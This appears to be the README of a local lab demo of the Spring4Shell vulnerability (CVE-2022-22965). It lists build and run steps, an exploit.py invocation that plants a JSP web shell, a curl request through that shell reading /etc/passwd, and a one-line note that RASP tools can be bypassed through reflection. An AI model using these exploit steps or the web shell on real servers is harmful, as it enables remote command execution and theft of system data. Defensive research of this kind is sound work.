1. mvn clean package
2. docker build . -t cve-2022-22965-exploit
3. docker run -v $(pwd)/contrast-config.yaml:/opt/agent/contrast-config.yaml  -p 8080:8080 -p 8000:8000 cve-2022-22965-exploit
4. curl http://localhost:8080/exploit/greeting
5. python3 -m pip install -r requirements.txt
6. python3 exploit.py --url="http://localhost:8080/exploit/greeting" --dir="webapps/ROOT" --file="cmd"
7. curl "http://localhost:8080/cmd.jsp?cmd=cat%20/etc/passwd"


**Defenses**
- RASP Solutions should work as close as possible to the native FFI call, otherwise it will be bypassed through reflection.